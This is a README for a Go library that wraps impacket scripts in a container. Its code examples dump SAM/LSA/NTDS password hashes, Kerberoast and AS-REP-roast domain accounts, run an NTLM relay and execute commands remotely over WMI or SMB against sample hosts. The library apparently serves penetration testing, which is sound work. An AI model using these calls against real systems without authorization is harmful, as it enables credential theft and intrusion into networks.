# impacket — Go wrappers for impacket scripts

Package `impacket` provides typed Go wrappers for the [impacket](https://github.com/fortra/impacket) Python toolkit, running inside a Podman container managed by [`containers.ProcManager`](../containers/).

## Container image

The image is built from [`Dockerfile`](Dockerfile) — `python:3.13-alpine` with impacket 0.12.0 installed in a venv:

```sh
# Build for arm64 (run on an arm64 machine or use emulation)
podman build --platform linux/arm64 -t oioni/impacket:arm64 .

# Export for gokrazy deployment
podman save oioni/impacket:arm64 | gzip > /tmp/impacket-arm64.tar.gz
```

The compressed image is ~40 MB; ~125 MB uncompressed. On gokrazy it is shipped via `ExtraFilePaths` in `config.json` and loaded at first run.

## Quick start

```go
imp := impacket.New() // uses /usr/share/oioni/impacket-arm64.tar.gz on gokrazy

// Dump SAM hashes
creds, err := imp.SecretsDump(ctx, "run1", impacket.SecretsDumpConfig{
    Target:   "192.168.1.10",
    Username: "Administrator",
    Password: "Password1",
})
for _, c := range creds {
    fmt.Printf("%s:%s\n", c.Username, c.Hash)
}

// Kerberoast
tickets, err := imp.Kerberoast(ctx, "kb1", impacket.KerberoastConfig{
    Target: "dc01.corp.local", Domain: "corp.local",
    Username: "jsmith",       Password: "Summer2024!",
})

// Remote exec
result, err := imp.Exec(ctx, "exec1", impacket.ExecConfig{
    Target:   "192.168.1.10",
    Username: "Administrator", Password: "Password1",
    Command:  "whoami",
    Method:   impacket.ExecWMI,
})
fmt.Println(result.Output)
```

## API reference

### Constructor

```go
// Default — loads image from /usr/share/oioni/impacket-arm64.tar.gz
imp := impacket.New()

// Custom image path (dev/testing)
imp := impacket.New(impacket.WithLocalImage("/tmp/my-image.tar.gz"))

// Inject a test double
imp := impacket.NewWithManager(fakeMgr)
```

### Tools

#### SecretsDump

Dumps SAM / LSA secrets / NTDS hashes from a Windows host.

```go
creds, err := imp.SecretsDump(ctx, name, impacket.SecretsDumpConfig{
    Target:   "192.168.1.10",
    Username: "Administrator",
    Password: "Password1",   // or Hash: "aad3b435...:31d6cfe0..."
    Domain:   "corp.local",  // optional
})
// creds: []Credential{Username, Domain, Hash, Type}
```

#### NTLMRelay

Starts an NTLM relay daemon (long-running). Returns a `*Process`; call `proc.Wait()` to block or `mgr.Stop()` to shut down.

```go
proc, err := imp.NTLMRelay(ctx, name, impacket.NTLMRelayConfig{
    RelayTarget: "smb://192.168.1.10",
})
// proc.Lines() streams relay events
signal.Notify(sigCh, syscall.SIGTERM)
<-sigCh
imp.Stop(ctx, name)
```

#### Kerberoast / ASREPRoast

```go
tickets, err := imp.Kerberoast(ctx, name, impacket.KerberoastConfig{
    Target: "dc01.corp.local", Domain: "corp.local",
    Username: "jsmith", Password: "Summer2024!",
})
// tickets: []KerberosTicket{Username, ServiceName, Hash}

hashes, err := imp.ASREPRoast(ctx, name, impacket.ASREPRoastConfig{
    Target: "dc01.corp.local", Domain: "corp.local",
    Username: "jsmith", Password: "Summer2024!",
})
// hashes: []ASREPHash{Username, Hash}
```

#### LookupSID / SAMRDump

```go
sids, err := imp.LookupSID(ctx, name, impacket.LookupSIDConfig{
    Target: "192.168.1.10", Username: "guest", Password: "",
})
// sids: []SIDEntry{SID, Name, Type}

users, err := imp.SAMRDump(ctx, name, impacket.SAMRDumpConfig{
    Target: "192.168.1.10", Username: "Administrator", Password: "Password1",
})
// users: []SAMRUser{Username, RID, Disabled}
```

#### Exec

Runs a command on a remote host via WMI, SMB (psexec), or SMBExec.

```go
result, err := imp.Exec(ctx, name, impacket.ExecConfig{
    Target:   "192.168.1.10",
    Username: "Administrator", Password: "Password1",
    Command:  "ipconfig /all",
    Method:   impacket.ExecWMI,   // or ExecSMB, ExecSMBExec
})
fmt.Println(result.Output)
```

#### Run (raw)

Invoke any impacket script directly:

```go
proc, err := imp.Run(ctx, name, "GetADUsers.py", []string{"-all", "corp.local/jsmith:pass@dc01"})
for line := range proc.Lines() {
    fmt.Println(line)
}
```

## Testing

All tools are unit-tested with a fake `ProcessStarter` — no Podman installation needed:

```sh
cd tools && go test ./impacket/... -v
```
